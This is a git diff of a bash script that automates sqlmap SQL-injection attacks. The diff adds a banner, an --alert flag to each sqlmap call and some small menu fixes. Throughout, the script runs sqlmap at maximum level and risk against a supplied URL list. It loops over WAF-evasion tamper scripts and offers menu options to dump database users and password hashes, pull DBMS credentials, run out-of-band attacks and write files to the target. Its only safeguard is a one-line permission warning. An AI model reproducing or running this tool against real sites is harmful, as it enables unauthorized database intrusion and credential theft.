@@ -1,11 +1,19 @@
 #!/bin/bash
 
+cute  () {
 
-      echo "SQlMAP AUTOMATION"
-      echo "NOBODY HIDE FORM ME!"
-
-echo "@Deepak"
-echo "@binwalk "
+    echo "                              SQlMAP AUTOMATION"
+    echo "                              NoBoDY HiDe fRoM mE!"
+echo " "
+echo " "
+echo " "
+echo " "
+echo "@Deepak                                                            @binwalk"
+echo " "
+echo "WARNING!!!
+             Nobody takecare of repsonsiblity of you action. always takes a permission."
+echo " "
+}
 
 tamp=('apostrophemask' 'apostrophenullencode' 'base64encode' 'between' 'bluecoat' 'chardoubleencode' 'charencode' 'charunicodeencode''concat2concatws ''equaltolike''greatest''halfversionedmorekeywords''ifnull2ifisnull''modsecurityversioned''modsecurityzeroversioned''multiplespaces''nonrecursivereplacement''percentage''randomcase''randomcomments''securesphere''space2comment''space2dash''space2hash''space2morehash''space2mssqlblank''space2mysqldash''space2plus''space2randomblank''unionalltounion''unmagicquotes')
 
@@ -21,7 +29,7 @@ injection () {
     ##################################
     echo "$i"
     ##################################
-        sqlmap -m "$urls" --dbms="$dbms" --level=5 --risk=3 --threads=5 --batch --dbs tamper="$i"
+        sqlmap -m "$urls" --dbms="$dbms" --level=5 --risk=3 --threads=5 --batch --dbs tamper="$i" --alert="Vulnerability Found"
     
     done
 
@@ -38,7 +46,7 @@ file_based_attack() {
     ##################################
     echo "$i"
     ##################################
-       sqlmap -m "$urls" --dbms="$dbms" --level=5 --risk=3 --threads=5 --batch --dbs tamper="$i"
+       sqlmap -m "$urls" --dbms="$dbms" --level=5 --risk=3 --threads=5 --batch --dbs tamper="$i" --alert="Vulnerability Found"
     
     done
     
@@ -55,7 +63,7 @@ brute_based_attacks () {
     ##################################
     echo "$i"
     ##################################
-        sqlmap -m "$urls"  --dbms="$dbms" --level=5 --risk=3 --threads=5 --batch --users --passwords --tamper="$i"
+        sqlmap -m "$urls"  --dbms="$dbms" --level=5 --risk=3 --threads=5 --batch --users --passwords --tamper="$i" --alert="Vulnerability Found"
     
     done
 
@@ -71,7 +79,7 @@ time_based_attacks () {
     ##################################
     echo "$i"
     ##################################
-    sqlmap -m "$urls" --dbms="$dbms" --level=5 --risk=3 --threads=5 --batch --time-sec=5 --dbs --tamper="$i"
+    sqlmap -m "$urls" --dbms="$dbms" --level=5 --risk=3 --threads=5 --batch --time-sec=5 --dbs --tamper="$i" --alert="Vulnerability Found"
     
     done 
 
@@ -87,7 +95,7 @@ error_based_attacks () {
     ##################################
     echo "$i"
     ##################################
-   sqlmap -m "$urls" --dbms="$dbms"--level=5 --risk=3 --threads=5 --batch --errors --tamper="$i"
+   sqlmap -m "$urls" --dbms="$dbms"--level=5 --risk=3 --threads=5 --batch --errors --tamper="$i" --alert="Vulnerability Found"
 
     
     done 
@@ -104,7 +112,7 @@ blind_based_attacks () {
     ##################################
     echo "$i"
     ##################################
-    sqlmap -m "$urls" --dbms="$dbms" --level=5 --risk=3 --threads=5 --batch --dbms-cred --tamper="$i"
+    sqlmap -m "$urls" --dbms="$dbms" --level=5 --risk=3 --threads=5 --batch --dbms-cred --tamper="$i" --alert="Vulnerability Found"
 
     
     done 
@@ -120,7 +128,7 @@ out_of_band_attacks () {
     ##################################
     echo "$i"
     ##################################
-    sqlmap -m "$urls" --dbms="$dbms" --level=5 --risk=3 --threads=5 --batch --oob --file-write="/tmp/data.txt" --tamper="$i"
+    sqlmap -m "$urls" --dbms="$dbms" --level=5 --risk=3 --threads=5 --batch --oob --file-write="/tmp/data.txt" --tamper="$i" --alert="Vulnerability Found"
 
     
     done      
@@ -139,7 +147,7 @@ database_detect () {
     ##################################
     echo "$i"
     ##################################
-    sqlmap -m "$urls"  --level=5 --risk=3 --threads=5 --batch --banner --tamper="$i"
+    sqlmap -m "$urls"  --level=5 --risk=3 --threads=5 --batch --banner --tamper="$i" --alert="Vulnerability Found"
 
     
     done 
@@ -150,17 +158,17 @@ database_detect () {
 ##          ## 
 
 process () {
- select attack in  injection_based  file_based blind_based brute_based time_based error_based out_of_band bayekar data_base_detect 
+ select attack in  injection_based  file_based blind_based  brute_based time_based error_based out_of_band bayekar data_base_detect 
  do 
     case $attack in 
 
-        injection_based)
+        injection_based )
                       echo "Injection Attacks..."
                      injection #function 
                       break
                        ;;
         
-        file_based)
+        file_based )
                    echo "File Based Attacks"
                    file_based_attack
                    break
@@ -219,7 +227,7 @@ process () {
                   ;;
                  *)
                  echo "Try again.."
-                   break
+                   continue
                   ;;
             esac
  done
@@ -244,9 +252,12 @@ setup () {
     clear
     sudo apt install sqlmap
     clear
+    cute
     process
     else
     echo "$TOOL is already installed."
+    clear
+    cute
     process
     fi
     
@@ -277,7 +288,6 @@ folder () {
 # fir
 urls=$1
 dbms=$2
-enter
 folder
 setup
 
